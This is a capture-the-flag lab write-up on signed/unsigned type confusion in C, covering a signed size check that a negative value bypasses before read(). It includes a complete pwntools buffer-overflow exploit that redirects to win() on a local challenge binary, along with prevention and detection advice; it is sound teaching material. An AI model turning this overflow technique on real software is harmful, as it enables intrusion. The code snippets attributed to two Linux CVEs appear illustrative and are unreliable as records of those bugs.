# Challenge 15: Signed/Unsigned Confusion

## Difficulty: Medium

## Vulnerability Type: Signed/Unsigned Type Confusion

## Description
The program validates a size parameter as a signed integer but passes it to functions expecting unsigned values, allowing bypass of security checks.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### The Bug
```c
int size;  // Signed: -2147483648 to 2147483647
scanf("%d", &size);

if (size > 64) {  // Checks as signed
    return;
}

read(0, buffer, size);  // Expects size_t (unsigned)!
```

### Type Confusion
When a negative number is cast to unsigned:
```c
int size = -1;  // 0xFFFFFFFF as 32-bit signed
size_t len = size;  // Interprets as 4294967295 (unsigned)!
```

### Passing the Check
```
size = -1
Check: -1 > 64? NO -> Passes ✓
read(0, buffer, -1) -> Interprets as read(0, buffer, 4294967295)
Massive overflow!
```

## Exploitation Strategy

### Step 1: Send Negative Size
```python
size = -1  # Or any negative number
# -1 interpreted as unsigned = 0xFFFFFFFF = 4294967295
```

### Step 2: Overflow Buffer
```python
# Send payload to overflow
offset = 72  # 64 byte buffer + 8 byte RBP
payload = b'A' * offset
payload += p64(win_addr)
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9015)
else:
    p = process('./challenge')

win_addr = elf.symbols['win']
log.info(f"win(): {hex(win_addr)}")

# Send negative size to bypass check
p.sendlineafter(b'Size: ', b'-1')

# Build overflow payload
offset = 72
payload = b'A' * offset
payload += p64(win_addr)

p.sendafter(b'Data: ', payload)
p.interactive()
```

### Why This Works
```
int size = -1;  // Binary: 0xFFFFFFFFFFFFFFFF (64-bit)

As signed int: -1
As unsigned size_t: 18446744073709551615

Check: if (-1 > 64) -> FALSE, passes check
read(): Sees 18446744073709551615 bytes to read!
```

## Type Conversion Rules

### Implicit Conversion
```c
int signed_val = -1;
size_t unsigned_val = signed_val;  // Implicit conversion
// unsigned_val = 0xFFFFFFFFFFFFFFFF (64-bit)
```

### Comparison Issues
```c
int a = -1;
unsigned int b = 1;

if (a < b) {  // a is converted to unsigned!
    // a becomes 4294967295
    // 4294967295 < 1? FALSE!
    printf("This won't print!\n");
}
```

## Automated Detection
- **Signed Variable**: int, short, char (signed)
- **Unsigned Function Parameter**: size_t, unsigned int
- **Validation Before Cast**: Check on signed, use as unsigned
- **Pattern**: if (signed_val < limit) { func(..., signed_val); }
- **Strategy**: Send negative value to bypass check

## Real-World Examples

### CVE-2010-2960 (Linux Kernel)
```c
int size;
copy_from_user(&size, user_ptr, sizeof(size));
if (size > MAX_SIZE) return -EINVAL;
memcpy(buf, src, size);  // Negative size = huge unsigned!
```

### CVE-2013-2094 (Linux perf_events)
```c
int64_t size = user_size;
if (size < 0) return -EINVAL;
// ... later code path doesn't re-check
size_t alloc_size = size;  // Can be negative through different path
kmalloc(alloc_size);
```

## C Type Sizes and Ranges

| Type | Size | Signed Range | Unsigned Range |
|------|------|--------------|----------------|
| char | 1 | -128 to 127 | 0 to 255 |
| short | 2 | -32768 to 32767 | 0 to 65535 |
| int | 4 | -2147483648 to 2147483647 | 0 to 4294967295 |
| long | 8* | -9223372036854775808 to ... | 0 to 18446744073709551615 |

*On 64-bit Linux

## Prevention

### Proper Validation
```c
int size;
scanf("%d", &size);

// Check both bounds
if (size < 0 || size > MAX_SIZE) {
    return -1;
}

// Safe to cast now
read(0, buffer, (size_t)size);
```

### Use Appropriate Types
```c
// If value should never be negative, use unsigned
unsigned int size;
scanf("%u", &size);  // Read as unsigned

if (size > MAX_SIZE) {
    return -1;
}
```

### Compiler Warnings
```bash
gcc -Wsign-compare -Wsign-conversion -Wconversion
```

### Safe Integer Libraries
```c
#include <stdint.h>

// Use fixed-width types
int32_t size;  // Always 32-bit signed
uint32_t usize;  // Always 32-bit unsigned
```

## Learning Objectives
- Signed vs unsigned representation
- Type conversion rules in C
- Security implications of type confusion
- Importance of type-aware validation
- Reading function signatures carefully

## Debugging Tips
```gdb
# Check how value is interpreted
p size
p (unsigned int) size
p (size_t) size

# See binary representation
p/t size  # Binary
p/x size  # Hex
```

## Additional Patterns

### Length vs Remaining
```c
int remaining = MAX - used;  // Can go negative!
if (remaining < 0) remaining = 0;  // Fix attempt

memcpy(buf, src, remaining);  // If still negative in some path...
```

### Comparison Shopping
```c
if (user_size < buffer_size) {  // Both different types
    // Which gets converted?
    // If user_size is signed and negative...
}
```
